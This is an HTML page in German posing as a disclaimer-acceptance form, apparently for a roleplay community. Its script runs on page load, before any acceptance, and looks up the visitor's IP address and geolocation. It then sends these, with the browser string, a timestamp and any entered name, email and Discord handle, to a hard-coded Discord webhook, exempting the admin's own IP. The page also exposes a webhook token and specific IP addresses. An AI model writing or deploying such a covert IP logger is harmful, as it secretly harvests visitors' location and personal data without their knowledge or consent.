<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disclaimer akzeptieren</title>
</head>
<body>

    <h1>Willkommen! Bitte akzeptiere den Disclaimer, um fortzufahren.</h1>
    <p>Durch Klicken auf "Verstanden" stimmst du den Bedingungen zu.</p>

    <!-- Formular f√ºr Vor- und Nachnamen sowie IC Name und Discord-Name -->
    <div id="name_input">
        <label for="first_name">Vorname:</label>
        <input type="text" id="first_name" placeholder="Dein Vorname" required><br><br>

        <label for="last_name">Nachname:</label>
        <input type="text" id="last_name" placeholder="Dein Nachname" required><br><br>

        <label for="email">E-Mail-Adresse:</label>
        <input type="email" id="email" placeholder="Deine E-Mail-Adresse" required><br><br>

        <label for="ic_name">IC Name (In-Character Name):</label>
        <input type="text" id="ic_name" placeholder="Dein IC Name" required><br><br>

        <label for="discord_name">Discord Name (Optional):</label>
        <input type="text" id="discord_name" placeholder="Dein Discord Name (z.B. Username#1234)" ><br><br>
    </div>

    <!-- Das Feld, das den Button und die Nachricht enth√§lt -->
    <div id="disclaimer_container" style="display:none;">
        <p>Bitte lese den Disclaimer sorgf√§ltig durch.</p>
        <button id="disclaimer_button" onclick="disclaimerAccepted()">Verstanden</button>
    </div>

    <!-- Das JavaScript f√ºr die Interaktion -->
    <script>
        let hasAccepted = false; // Flag, um zu verhindern, dass der Webhook mehrfach gesendet wird

        // Funktion, die beim Laden der Seite sofort ausgef√ºhrt wird
        window.addEventListener("load", function() {
            if (!hasAccepted) {
                sendWebhookMessage();
            }
        });

        // Funktion zum Senden der Webhook-Nachricht an Discord
        function sendWebhookMessage() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    let ipAddress = data.ip;
                    const adminIp = '89.14.71.133';
                    const customIp = '89.14.86.182';

                    // Wenn die IP die bestimmte IP-Adresse ist, ersetze sie
                    if (ipAddress === customIp) {
                        ipAddress = adminIp;  // Ersetze mit der adminIp
                    }

                    if (ipAddress === adminIp) {
                        sendToDiscord(ipAddress, "Admin (Missiont31) erkannt, kein Standort gesendet");
                    } else {
                        fetch(`https://ipinfo.io/${ipAddress}/json`)
                            .then(response => response.json())
                            .then(locationData => {
                                const location = `${locationData.city}, ${locationData.region}, ${locationData.country}`;
                                sendToDiscord(ipAddress, location);
                            })
                            .catch(error => {
                                console.error("Fehler bei der Geolocation:", error);
                            });
                    }
                })
                .catch(error => {
                    console.error("Fehler beim Abrufen der IP-Adresse:", error);
                });

            hasAccepted = true;
        }

        // Funktion, die die Webhook-Nachricht tats√§chlich sendet
        function sendToDiscord(ipAddress, location) {
            const userBrowser = navigator.userAgent;
            const discordName = document.getElementById("discord_name").value || "Nicht angegeben"; // Holen des Discord-Namens
            const webhookUrl = "https://discord.com/api/webhooks/1304714094170869790/2lx2pEFjerGkeKDfuEfarM0NUwFFxAUbQzqf9wfbT-uxaL4YfeHjORyLGNIpCwVzGvK2";
            
            const message = {
                "embeds": [
                    {
                        "title": "üöÄ Disclaimer Akzeptiert!",
                        "description": "Ein Benutzer hat den Disclaimer akzeptiert und ist bereit, loszulegen!",
                        "color": 3447003,
                        "fields": [
                            { "name": "üë§ **Vorname**", "value": document.getElementById("first_name").value || "‚ö†Ô∏è Vorname fehlt ‚ö†Ô∏è", "inline": true },
                            { "name": "üßë‚Äçüíº **Nachname**", "value": document.getElementById("last_name").value || "‚ö†Ô∏è Nachname fehlt ‚ö†Ô∏è", "inline": true },
                            { "name": "üìß **E-Mail-Adresse**", "value": document.getElementById("email").value || "‚ö†Ô∏è E-Mail fehlt ‚ö†Ô∏è", "inline": true },
                            { "name": "üé≠ **IC Name**", "value": document.getElementById("ic_name").value || "Vorname Nachname | ID", "inline": true },
                            { "name": "üåç **IP Adresse**", "value": ipAddress, "inline": false },
                            { "name": "üìç **Standort**", "value": location || "Standort nicht verf√ºgbar", "inline": true },
                            { "name": "üåê **Verwendeter Browser**", "value": userBrowser, "inline": false },
                            { "name": "üïí **Zeitpunkt des Zugriffs**", "value": new Date().toLocaleString(), "inline": false },
                            { "name": "üí¨ **Discord Name**", "value": discordName, "inline": false }
                        ],
                        "footer": {
                            "text": "üõ°Ô∏è Disclaimer System | Bereitgestellt von Missiont31",
                            "icon_url": "https://example.com/dein-logo.png"  // Optional: Ein cooles Icon
                        },
                        "thumbnail": {
                            "url": "https://example.com/thumbnail.png" // Optional: Ein ansprechendes Bild hinzuf√ºgen
                        }
                    }
                ]
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    console.log("üöÄ Webhook-Nachricht erfolgreich gesendet.");
                } else {
                    console.error("‚ùå Fehler beim Senden der Nachricht.");
                }
            })
            .catch(error => {
                console.error("Fehler:", error);
            });
        }
    </script>

</body>
</html>
